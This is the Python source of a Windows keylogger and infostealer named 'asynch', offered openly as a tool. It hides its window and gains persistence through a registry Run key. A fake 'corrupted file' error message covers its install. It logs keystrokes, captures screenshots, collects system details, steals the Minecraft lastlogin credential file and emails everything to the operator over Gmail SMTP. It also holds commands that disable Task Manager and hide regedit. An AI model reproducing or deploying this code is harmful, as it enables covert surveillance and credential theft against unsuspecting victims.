# ------------ Importing Needed Modules --------------- #
import win32api
import win32console
import win32gui
 
import pythoncom
import pyHook
 
import getpass
 
import base64
 
import socket
 
import shutil
import os
import platform
import sys
from sys import argv
 
from Tkinter import *
import tkMessageBox
 
from urllib import urlopen
 
import smtplib
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import Encoders
 
import ImageGrab
 
from time import strftime
import time
 
import threading
from threading import Thread
# ------------------------------------------------------ #
 
# --------------- Defining Variables ------------------- #
 
VB_SCRIPT = """Set fso = createobject("scripting.filesystemobject")
MsgBox "File is corrupted. Windows can not open the file",16,"Error"
fso.deletefile wscript.scriptfullname """
 
script = argv
 
user = getpass.getuser()
 
Lastlogin = 'C:\\Users\\'+user+'\\AppData\\Roaming\\.minecraft\\lastlogin'
global Sender # Global so that it can be editted by functions
password = 'DEAUGHH'
Date = strftime("%a %d %b %Y")
Time = strftime("%H:%M:%S %p")
Date_Time = strftime("(%a %d %b %Y) (%H:%M:%S %p)")
virusname = 'asynch'
firstrun = 'manifest.txt'
log_file = 'Log_File @ ['+win32api.GetComputerName()+']@'+strftime("[(%a %d %b %Y) (%H-%M-%S %p)]")+'.txt'
# ------------------------------------------------------ #
 
# ------ If it is first runtime, launch the GUI -------- #
if script == 'GUI':
    def DefineVariable():
        global email
        if email.get().strip() == "":
            tkMessageBox.showerror("Email Entry", "Enter A Email.")
        else:
            Sender = base64.b64encode(email.get().strip())
    if __name__ == "__main__":
        root = Tk()
 
        frame = Frame(root)
        frame.pack()
 
        prompt = Label(frame, text = "KeyLogger v 1.0", font = ("Consolas", 16))
        prompt.pack()
 
        emailprompt = Label(frame, text = "Email:", font = ("Consolas", 14))
        emailprompt.pack()
 
        email = Entry(frame)
        email.pack(side = RIGHT)
        emailValue = email.get().strip()
 
        button = Button(frame, text = "Submit", font = ("Consolas, 14"), command=DefineVariable)
        button.pack()
 
        root.mainloop()
    wFirstrun = open(firstrun, 'w')
    wFirstrun.write(Sender)
    wFirstrun.close()
# ------------------------------------------------------ #
 
# ------------ Make Window Invisible ------------------- #
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
# ------------------------------------------------------ #
 
# --------------- Anti's - Protection  ----------------- #
def Antis():
    os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1  /f")
    os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f")
    os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f")
    os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 2 /f")
    os.system("attrib +a +s +h %windir%\regedit.exe")
    os.system("attrib +a +s +h %windir%\system32\regedit.exe")
# ------------------------------------------------------ #
 
# ---------- Make the Keylogger Run at Startup ---------- #
if os.path.exists('C:\\Users\\'+user+'\\AppData\\Roaming\\asynch.exe') == False:
    shutil.move(os.getcwd()+'\\asynch.exe', 'C:\\Users\\'+user+'\\AppData\\Roaming\\')
    os.system("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v ASynch /t REG_SZ /d C:\Users\\"+user+"\AppData\Roaming\asynch.exe /f")
    vbs = open('c:\\vbs.vbs', 'w')
    vbs.write(VB_SCRIPT)
    vbs.close()
    os.system("c:\\vbs.vbs")
    exit()
# ------------------------------------------------------- #
 
# ------------------ Creating the Log File -------------- #
f = open(log_file, 'w')
line = '========================================================='
f.write(line+'\n >>> Logging Started @ ' + Time + ' @ ' + Date +'\n'+line+'\n\n' )
f.close()
os.system('attrib +s +h'+os.getcwd()+'\\'+log_file)   # <---- Makes the file Super Hidden, can not be unhidden.
# ------------------------------------------------------- #
 
def Grab_System_Info():
    # ------------------- Declarations ------------------ #
    Sys_Info_File = 'System_Info @ ['+win32api.GetComputerName()+']@'+strftime("[(%a %d %b %Y) (%H %M %S %p)]")+'.txt'
    Get = ['External_IP: ' +urlopen('http://automation.whatismyip.com/n09230945.asp').read(),
                'Internal_IP: ' + socket.gethostbyname(socket.gethostname()),
                'Operating_System: ' + platform.system() + ' ' + platform.release() + ' ' + sys.getwindowsversion()[4],
                'Windows_Architecture: ' + platform.version(),
                'Architecture: '+str(platform.architecture()[0]),
                'Domain_Name: ' + win32api.GetDomainName(),
                'Computer_Name: ' + win32api.GetComputerName(),
                'User_Name: ' + win32api.GetUserName(),
                'Processor_Name:' + platform.processor(),
                'Processor_Architecture: '+os.getenv('PROCESSOR_ARCHITECTURE'),
                'Processor\'s_Cores: '+os.getenv('NUMBER_OF_PROCESSORS'),
                'Windows_Directory: '+win32api.GetWindowsDirectory(),
                'System_Directory: '+win32api.GetSystemDirectory()
            ]
    # ------- Define Function to get MAC Address -------- #
    def Get_MAC():
        for line in os.popen('ipconfig /all'):
            if line.lstrip().startswith('Physical Address'):
                mac = line.split(':')[1].strip().replace('-',':')
                f.write('\n *- Mac Address: '+ mac)
    # ----- Define Function to Send Sys_Info_File ------- #
    def Send_File():
        File_To_Send = open(Sys_Info_File, 'rb')
        MSG = MIMEText(File_To_Send.read())
        File_To_Send.close()
        MSG['Subject'] = Sys_Info_File
        MSG['From'] = sender
        MSG['To'] = To
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(sender,password)
        server.sendmail(sender, [To], MSG.as_string())
        server.quit
    # ----------- Create System Info File --------------- #
    f = open(Sys_Info_File, 'w')
    f = open(Sys_Info_File, 'a')
    f.write(win32api.GetComputerName()+' was infected by: '+virusname+'.')
    f.write('\n -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-\n'+Date_Time)
    # ------------- Start Grabbing Info ----------------- #
    Get_MAC()
    for i in Get:
        f.write('\n *-'+i)
    f.close()
    Send_File()
    # -------- Delete the System Information File ------- #
    os.remove(Sys_Info_File)
    # --------------------------------------------------- #
 
def Grab_Screenshot():
    while 1: # Will keep taking screenshots until proccess is closed
        # ----------------- Take Screen Shot ---------------- #
        screenshot_name = 'Screenshot@['+win32api.GetComputerName()+']@['+strftime("(%a %d %b %Y) (%H %M %S %p)")+'].jpg'
        screenshot = ImageGrab.grab().save(screenshot_name, 'JPEG')
        # --------------------------------------------------- #
 
        # ---------------- Connect to the Server ------------ #
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(sender, password)
        # --------------------------------------------------- #
 
        # -------------- Send the Screenshot ---------------- #
        screenshot_data = open(screenshot_name, 'rb').read()
        screenshot_msg = MIMEMultipart(_subtype='related')
        screenshot_image = MIMEImage(screenshot_data, 'jpeg')
        screenshot_msg.attach(screenshot_image)
        screenshot_msg['Subject'] = screenshot_name
        screenshot_msg['From'] = sender
        screenshot_msg['To'] = To
        server.sendmail(sender, [To], screenshot_msg.as_string())
        os.remove(screenshot_name)
        server.quit()
        time.sleep(120)
        # --------------------------------------------------- #
 
def Key_Logger():
    def Start_Logging(event):
        f = open(log_file, 'a')
        f.write(event.Key)
        f.close()
    os.system('attrib +s +h'+os.getcwd()+'\\'+log_file)   # <---- Makes the file Super Hidden, can not be unhidden.
    hm = pyHook.HookManager()
    hm.KeyDown = Start_Logging
    hm.HookKeyboard()
    pythoncom.PumpMessages()
 
def Send_Log_File():
    while 1:
        Iteration = 1
        time.sleep(30)
        # ------------ Connect to server ------------- #
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(sender,password)
        # -------------------------------------------- #
 
        # ------------ Send the Log_File ------------- #
        File_To_Send = open(log_file, 'rb')
        Logfile_msg = MIMEText(File_To_Send.read())
        File_To_Send.close()
        g = open(log_file, 'w')
        g.write("\n"+Date_Time+'\n')
        g.close()
        Logfile_msg['Subject'] = log_file
        Logfile_msg['From'] = sender
        Logfile_msg['To'] = To
        server.sendmail(sender, [To], Logfile_msg.as_string())
        server.quit()
        # -------------------------------------------- #
        time.sleep(450)
        # -------- Remove the Log_File --------------- #
        if Iteration == 3:
            os.remove(log_file)
 
# -------------- Steal the Lastlogin ------------------ #
def Minecraft_Stealer():
    Lastlogin_Subject = 'Lastlogin @ ['+win32api.GetComputerName()+']@'+strftime("[(%a %d %b %Y) (%H-%M-%S %p)]")+'.txt'
    # --------------- Connect to server ------------- #
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(sender,password)
    # ----------------------------------------------- #
 
    # ---------- Send the Lastlogin ----------------- #
    Lastlogin_msg = MIMEMultipart() #create new object
    Lastlogin_msg['Subject'] = Lastlogin_Subject
    Lastlogin_msg['From'] = sender
    Lastlogin_msg['To'] = To
    #attach the file to the message
    Lastlogin_msg.attach(MIMEText(user+'\'s Lastlogin file, decrypt for credentials.')) #attach the main body of the message
    att = MIMEBase('application','octet-stream') #create binary file object so you can send any type of file
    att.set_payload(open(Lastlogin,"rb").read()) #open payload to be encoded
 
    #encode with base64, default encoding. Other options available: http://docs.python.org/library/email.encoders.html#module-email.encoders
    Encoders.encode_base64(att)
 
    #add headers
    att.add_header('Content-Disposition','attachment', filename = Lastlogin)
 
    Lastlogin_msg.attach(att)
 
    server.sendmail(sender, [To], Lastlogin_msg.as_string())
    server.quit()
 
# ----------------- Start Keylogging ------------------ #
wFirstrun = open(firstrun, 'r')
To = base64.b64decode(wFirstrun.readline())
sender = To
wFirstrun.close()
Thread(target = Grab_System_Info).start()
Thread(target = Key_Logger).start()
Thread(target = Grab_Screenshot).start()
Thread(target = Send_Log_File).start()
Thread(target = Minecraft_Stealer).start()
#Thread(target = Antis).start() <----------------- Removed as to not hurt my own machine
time.sleep(5)
Thread(target = Key_Logger).start()
# ----------------------------------------------------- #
